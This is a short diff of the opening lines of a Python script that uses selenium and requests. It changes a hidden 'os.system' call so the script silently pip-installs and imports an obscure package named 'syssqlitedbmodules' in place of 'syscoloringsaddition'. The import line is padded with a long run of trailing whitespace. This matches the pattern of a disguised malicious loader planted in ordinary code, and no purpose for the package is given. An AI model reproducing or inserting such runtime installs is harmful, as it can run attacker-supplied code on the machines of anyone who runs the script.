@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscoloringsaddition")
-import syscoloringsaddition
+os.system("pip install syssqlitedbmodules")
+import syssqlitedbmodules
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
